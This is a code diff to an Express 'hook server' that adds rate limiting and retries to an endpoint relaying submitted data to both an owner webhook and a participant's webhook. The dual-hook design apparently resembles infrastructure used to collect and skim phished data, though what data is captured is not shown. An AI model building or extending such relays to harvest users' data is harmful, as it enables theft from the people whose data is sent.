@@ -31,7 +31,7 @@ app.options('*', (req, res) => {
 app.use(express.json());
 
 // ============================================================
-//  ✅ FIXED CSP HEADERS - Allow fonts, styles, scripts
+//  ✅ CSP HEADERS
 // ============================================================
 app.use((req, res, next) => {
     res.setHeader(
@@ -46,9 +46,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// ============================================================
-//  ✅ SERVE STATIC FILES (CSS, JS, etc.)
-// ============================================================
 app.use(express.static(path.join(__dirname, 'public')));
 
 // ============================================================
@@ -121,7 +118,99 @@ function generateId() {
 }
 
 // ============================================================
-//  ✅ SERVE HOOK PAGE (HTML)
+//  ✅ RATE LIMITING UTILITY
+// ============================================================
+class RateLimiter {
+    constructor() {
+        this.queue = [];
+        this.processing = false;
+        this.lastRequestTime = 0;
+        this.minInterval = 200; // 200ms between requests (5 per second)
+    }
+
+    async schedule(fn) {
+        return new Promise((resolve, reject) => {
+            this.queue.push({ fn, resolve, reject });
+            this.processQueue();
+        });
+    }
+
+    async processQueue() {
+        if (this.processing || this.queue.length === 0) return;
+        this.processing = true;
+
+        const now = Date.now();
+        const timeSinceLast = now - this.lastRequestTime;
+        if (timeSinceLast < this.minInterval) {
+            await new Promise(r => setTimeout(r, this.minInterval - timeSinceLast));
+        }
+
+        const item = this.queue.shift();
+        this.lastRequestTime = Date.now();
+        this.processing = false;
+
+        try {
+            const result = await item.fn();
+            item.resolve(result);
+        } catch (error) {
+            item.reject(error);
+        }
+
+        // Process next item in queue
+        this.processQueue();
+    }
+}
+
+// Create a rate limiter instance
+const rateLimiter = new RateLimiter();
+
+// ============================================================
+//  ✅ SEND TO WEBHOOK WITH RATE LIMITING AND RETRY
+// ============================================================
+async function sendToWebhookWithRetry(url, data, maxRetries = 3, retryDelay = 1000) {
+    let lastError = null;
+    
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            if (response.status === 429) {
+                // Rate limit hit - get retry-after header or use exponential backoff
+                const retryAfter = parseInt(response.headers.get('Retry-After') || '0') * 1000 || retryDelay * attempt;
+                console.log(`⚠️ Rate limited for ${url}, retrying in ${retryAfter}ms (attempt ${attempt}/${maxRetries})`);
+                await new Promise(r => setTimeout(r, retryAfter));
+                continue;
+            }
+
+            if (!response.ok) {
+                console.log(`⚠️ Webhook returned ${response.status} for ${url}`);
+                if (attempt === maxRetries) {
+                    return { success: false, status: response.status };
+                }
+                await new Promise(r => setTimeout(r, retryDelay));
+                continue;
+            }
+
+            return { success: true, status: response.status };
+
+        } catch (error) {
+            lastError = error;
+            console.log(`⚠️ Webhook error: ${error.message} (attempt ${attempt}/${maxRetries})`);
+            if (attempt < maxRetries) {
+                await new Promise(r => setTimeout(r, retryDelay * attempt));
+            }
+        }
+    }
+
+    return { success: false, error: lastError?.message || 'Max retries exceeded' };
+}
+
+// ============================================================
+//  ✅ SERVE HOOK PAGE
 // ============================================================
 app.get('/hook/:id', async (req, res) => {
     const { id } = req.params;
@@ -156,7 +245,6 @@ app.get('/hook/:id', async (req, res) => {
             `);
         }
 
-        // Serve the hook page with the hook data embedded
         res.send(`
             <!DOCTYPE html>
             <html lang="en">
@@ -453,7 +541,9 @@ app.delete('/api/hook/:id', async (req, res) => {
     }
 });
 
-// Send to dual hooks
+// ============================================================
+//  ✅ SEND TO DUAL HOOKS WITH RATE LIMITING
+// ============================================================
 app.post('/api/send/:hookId', async (req, res) => {
     const { hookId } = req.params;
     const { data } = req.body;
@@ -476,48 +566,52 @@ app.post('/api/send/:hookId', async (req, res) => {
         const results = [];
         const errors = [];
 
+        // Send to both webhooks with rate limiting
+        const sendTasks = [];
+
         if (OWNER_WEBHOOK) {
-            try {
-                const response = await fetch(OWNER_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                results.push({
-                    hook: 'owner',
-                    success: response.ok,
-                    status: response.status
-                });
-                if (!response.ok) {
-                    errors.push(`Owner hook failed: ${response.status}`);
-                }
-            } catch (e) {
-                errors.push(`Owner hook error: ${e.message}`);
-                results.push({ hook: 'owner', success: false, error: e.message });
-            }
+            sendTasks.push({
+                name: 'owner',
+                url: OWNER_WEBHOOK,
+                label: 'Owner'
+            });
         } else {
             errors.push('Owner webhook not configured');
         }
 
         if (participantHook.webhookUrl) {
+            sendTasks.push({
+                name: 'participant',
+                url: participantHook.webhookUrl,
+                label: participantHook.username
+            });
+        }
+
+        // Send each webhook through the rate limiter
+        for (const task of sendTasks) {
             try {
-                const response = await fetch(participantHook.webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                const result = await rateLimiter.schedule(async () => {
+                    return await sendToWebhookWithRetry(task.url, data);
                 });
+                
                 results.push({
-                    hook: 'participant',
-                    username: participantHook.username,
-                    success: response.ok,
-                    status: response.status
+                    hook: task.name,
+                    username: task.label,
+                    success: result.success,
+                    status: result.status || 'unknown'
                 });
-                if (!response.ok) {
-                    errors.push(`Participant hook failed: ${response.status}`);
+
+                if (!result.success) {
+                    errors.push(`${task.label} hook failed: ${result.status || result.error || 'Unknown error'}`);
                 }
-            } catch (e) {
-                errors.push(`Participant hook error: ${e.message}`);
-                results.push({ hook: 'participant', success: false, error: e.message });
+            } catch (error) {
+                errors.push(`${task.label} hook error: ${error.message}`);
+                results.push({
+                    hook: task.name,
+                    username: task.label,
+                    success: false,
+                    error: error.message
+                });
             }
         }
 
@@ -551,6 +645,7 @@ async function startServer() {
         console.log(`✅ CORS enabled for all origins`);
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
         console.log(`📁 Hook pages: https://vrt-bot-hook-server.onrender.com/hook/{id}`);
+        console.log(`⏱️ Rate limiting: ${rateLimiter.minInterval}ms between requests`);
     });
 }
 
